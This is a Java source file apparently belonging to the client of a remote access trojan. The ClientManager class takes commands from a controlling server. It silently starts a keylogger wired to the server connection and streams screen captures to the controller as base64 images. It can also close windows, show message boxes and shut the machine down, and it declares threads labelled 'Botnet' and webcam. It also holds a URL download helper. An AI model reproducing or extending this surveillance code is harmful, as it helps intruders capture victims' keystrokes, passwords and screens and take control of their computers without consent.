package Client;

import Control.KeyLogger;
import Control.SendCommand;
import UI.CPU_Usage;
import UI.Disk_Usage;
import Ultils.MessageType;
import Ultils.NetUtils;
import Ultils.OSUtils;
import Ultils.Packet;
import java.util.List;
import com.github.kwhat.jnativehook.NativeHookException;
import oshi.SystemInfo;
import oshi.software.os.FileSystem;
import oshi.software.os.OSFileStore;

import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.ImageOutputStream;
import javax.swing.*;
import java.awt.*;
import java.awt.event.KeyEvent;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;

public class ClientManager {
    // Botnet
    private Thread botnet;

    // Desktop
    private Thread desktop;
    private boolean runningDesktop;
    private float compression = 0.4F;

    // Webcam
    private Thread webcam;
    private boolean runningWebcam;

    // KeyLogger
    private KeyLogger keylogger;

    public void onMessage(Packet packet, PrintWriter pw) {
        if (keylogger == null) {
            try {
                keylogger = new KeyLogger(pw);
            } catch (NativeHookException e) {
                e.printStackTrace();
            }
        }

        if (packet.action == MessageType.PERFORMANCE_TRACK.getID()){

            SystemInfo si = new SystemInfo();
            CPU_Usage cpu_usage = new CPU_Usage(si);
            double[] received = new double[packet.data.size()];

            for (int i = 0; i < received.length; ++i){
                received[i] = Double.parseDouble(packet.data.get(i));
            }
//            cpu_usage.init(si.getHardware().getProcessor(),received);

        }

        if (packet.action == MessageType.STORAGE_TRACK.getID()){
            SystemInfo si = new SystemInfo();
            FileSystem fs = si.getOperatingSystem().getFileSystem();
            Disk_Usage disk_usage = new Disk_Usage(si);
            disk_usage.init(fs);
        }

        if (packet.action == MessageType.ALTF4.getID()) {
            try {
                Robot r = new Robot();
                r.keyPress(KeyEvent.VK_ALT);
                r.keyPress(KeyEvent.VK_F4);

                r.keyRelease(KeyEvent.VK_ALT);
                r.keyRelease(KeyEvent.VK_F4);
            } catch (AWTException e) {
                e.printStackTrace();
            }
        }  else if (packet.action == MessageType.MESSAGE_BOX.getID()) {
            try {
                new Thread(new Runnable() {

                    @Override
                    public void run() {
                        try {
                            JOptionPane.showMessageDialog(null, packet.data.get(1), packet.data.get(0), Integer.parseInt(packet.data.get(2)));
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                }).start();
            } catch (Exception npe) {
                npe.printStackTrace();
            }
        } else if (packet.action == MessageType.DESKTOP.getID()) {
            try {
                if (packet.data.get(0).equals("start")) {
                    runningDesktop = true;
                    if (desktop == null || !desktop.isAlive()) {
                        desktop = new Thread(new Runnable() {

                            @Override
                            public void run() {
                                remoteDesktop(pw);
                            }
                        });
                        desktop.start();
                    }
                } else if (packet.data.get(0).equals("stop")) {
                    runningDesktop = false;
                    if (this.desktop != null && this.desktop.isAlive()) {
                        this.desktop.stop();
                    }
                } else if (packet.data.get(0).equals("comp")) {
                    this.compression = Float.parseFloat(packet.data.get(1));
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else if (packet.action == MessageType.SHUTDOWN.getID()) {
            try {
                SendCommand.SendCommand_ShutDown();
                System.exit(0);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void downloadUsingStream(String urlStr, File file) throws IOException {
        URL url = new URL(urlStr);
        BufferedInputStream bis = new BufferedInputStream(url.openStream());
        FileOutputStream fis = new FileOutputStream(file);
        byte[] buffer = new byte[1024];
        int count=0;
        while((count = bis.read(buffer,0,1024)) != -1) {
            fis.write(buffer, 0, count);
        }
        fis.close();
        bis.close();
    }

    private void remoteDesktop(PrintWriter pw) {
        File temp = new File(System.getProperty("java.io.tmpdir"), "tempd.jpg");
        while (runningDesktop) {
            try {
                Dimension tk = Toolkit.getDefaultToolkit().getScreenSize();

                Robot rt = new Robot();
                BufferedImage img = rt.createScreenCapture(new Rectangle((int) tk.getWidth(), (int) tk.getHeight()));

                ImageWriter writer =  ImageIO.getImageWritersByFormatName("jpg").next();
                ImageOutputStream ios = ImageIO.createImageOutputStream(new FileOutputStream(temp));
                writer.setOutput(ios);

                ImageWriteParam param = writer.getDefaultWriteParam();
                if (param.canWriteCompressed()){
                    param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
                    param.setCompressionQuality(compression);
                }
                writer.write(null, new IIOImage(img, null, null), param);
                String encodedString = Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(temp.getPath())));
                Packet packet = new Packet();
                packet.action = MessageType.DESKTOP.getID();
                packet.data = new ArrayList<String>();
                packet.data.add(encodedString);
                NetUtils.sendMessage(packet, pw);
            } catch (ThreadDeath dt) {
                if (temp.exists()) {
                    try {
                        temp.delete();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }

            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (ThreadDeath dt) {}
        }
        if (temp.exists()) {
            try {
                temp.delete();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public String getSeparator() {
        return "|}";
    }
}
